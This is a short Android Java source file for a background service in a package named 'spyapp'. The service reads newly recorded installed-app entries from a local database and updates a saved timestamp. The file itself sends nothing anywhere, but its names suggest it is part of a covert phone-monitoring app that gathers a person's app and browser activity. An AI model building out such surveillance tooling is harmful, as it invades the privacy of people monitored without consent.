package com.app.spyapp.servercall;

import android.app.IntentService;
import android.content.Intent;
import android.util.Log;

import com.app.spyapp.SpyApp;
import com.app.spyapp.common.Const;
import com.app.spyapp.common.Pref;
import com.app.spyapp.model.BrowserModel;
import com.app.spyapp.model.InstallAppModel;

import java.util.ArrayList;


public class InstallAppCallService extends IntentService {

    private SpyApp spyApp;

    public InstallAppCallService() {
        super(InstallAppCallService.class.getSimpleName());
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        spyApp = (SpyApp) getApplicationContext();
        ArrayList<InstallAppModel> installAppList = spyApp.getDatabaseHelper().getInstallAppList(spyApp.getSharedPreferences().getString(Pref.INSTALL_APP_LAST_UPDATEDATE, Const.INITDATETIME));
        spyApp.getSharedPreferences().edit().putString(Pref.INSTALL_APP_LAST_UPDATEDATE, spyApp.getDatabaseHelper().getMaxDateofAppList()).apply();
        Log.i("Debug", "onHandleIntent: InstallAppService");
    }
}
